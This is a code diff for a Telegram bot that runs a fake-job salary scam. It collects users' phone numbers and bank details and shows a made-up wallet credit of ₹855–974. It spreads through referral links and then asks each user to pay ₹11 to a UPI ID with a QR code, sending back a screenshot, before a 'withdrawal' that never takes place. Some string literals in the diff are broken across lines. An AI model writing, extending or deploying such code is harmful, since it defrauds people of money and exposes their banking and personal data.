@@ -7,12 +7,33 @@ bot = telebot.TeleBot(TOKEN)
 
 user_state = {}
 otp_storage = {}
+user_data = {}
 salary_code = "HCPYRF"
 
 @bot.message_handler(commands=['start'])
 def start(m):
-    user_state[m.chat.id] = 'ASK_PHONE'
-    bot.send_message(m.chat.id, "👋 Please enter your Telegram number:")
+    cid = m.chat.id
+    args = m.text.split()
+    if len(args) > 1:
+        referrer = int(args[1])
+        if referrer != cid:
+            user_data.setdefault(referrer, {}).setdefault('referrals', 0)
+            user_data[referrer]['referrals'] += 1
+    user_state[cid] = 'ASK_PHONE'
+    bot.send_message(cid, "👋 Please enter your Telegram number:")
+
+@bot.message_handler(content_types=['photo'])
+def handle_photo(m):
+    cid = m.chat.id
+    if user_state.get(cid) == 'WAIT_SCREENSHOT':
+        user_data[cid]['screenshot'] = True
+        if user_data[cid].get('referrals', 0) >= 1:
+            bot.send_message(cid, "✅ Withdrawal successful! Your request is being processed.")
+        else:
+            bot.send_message(cid, "❌ You need at least 1 referral to withdraw.")
+        user_state[cid] = ''
+    else:
+        bot.send_message(cid, "❌ Unexpected image. Please follow instructions.")
 
 @bot.message_handler(func=lambda m: True)
 def handle(m):
@@ -39,7 +60,8 @@ def handle(m):
 
     if state == 'ASK_BANK_BTN' and text.startswith("✅"):
         user_state[cid] = 'ASK_BANK'
-        bot.send_message(cid, "Enter bank details like:\nA/C, IFSC, Bank Name")
+        bot.send_message(cid, "Enter bank details like:
+A/C, IFSC, Bank Name")
         return
 
     if state == 'ASK_BANK':
@@ -54,9 +76,29 @@ def handle(m):
 
     if state == 'ASK_CODE':
         if text == salary_code:
-            bot.send_message(cid, "🎉 Code verified! Your request is submitted.")
+            credited_amount = random.randint(855, 974)
+            user_data.setdefault(cid, {})['balance'] = credited_amount
+            user_data[cid]['referrals'] = user_data[cid].get('referrals', 0)
+            bot.send_message(cid, f"🎉 ₹{credited_amount} successfully credited to your wallet!")
+            bot.send_message(cid, f"🔗 Your referral link:
+https://t.me/Task_Youtube_Bot?start={cid}")
+            kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
+            kb.add("💼 Withdraw")
+            bot.send_message(cid, "👇 Tap below to withdraw your salary:", reply_markup=kb)
+            user_state[cid] = ''
         else:
             bot.send_message(cid, "❌ Invalid code.")
+        return
+
+    if text == "💼 Withdraw":
+        bot.send_message(cid, "💳 This is the final and last merchant task.
+You need to pay ₹11 to UPI ID:
+`9062435123@okbizaxis`
+and send the screenshot.
+
+📌 QR Code:", parse_mode='Markdown')
+        bot.send_photo(cid, "https://i.ibb.co/VYHmccgW/qr.jpg")
+        user_state[cid] = 'WAIT_SCREENSHOT'
         return
 
     bot.send_message(cid, "⚠️ Please follow the steps. Start with /start")
